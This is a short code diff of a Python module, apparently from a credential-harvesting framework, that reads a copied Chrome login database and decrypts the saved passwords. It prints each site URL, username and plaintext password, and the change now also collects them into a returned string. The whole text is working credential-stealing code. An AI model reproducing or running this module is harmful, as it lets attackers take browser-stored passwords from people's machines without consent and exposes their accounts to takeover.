@@ -104,16 +104,20 @@ class mod_chrome_logins(mod_interface):
         con = sqlite3.connect('chrome_logins')
         cur = con.cursor()
         query_result = cur.execute('SELECT * FROM logins')
+        sresult = ""
         for row in query_result:
             passwd = self.chrome_decrypt(row[5], safe_storage_key)
             if(row[3] != ""):
                 print(f'URL: {row[0]}:')
                 print(f'- Action-URL: {row[1]}')
                 print(f'- User: {row[3]}, Paswword: {passwd}')
+                sresult += f'URL: {row[0]}:\n'
+                sresult += f'- Action-URL: {row[1]}\n'
+                sresult += f'- User: {row[3]}, Password: {passwd}\n'
             else:
                 continue
 
         cur.close()
         con.close()
         os.remove('chrome_logins')
-        return query_result
+        return sresult
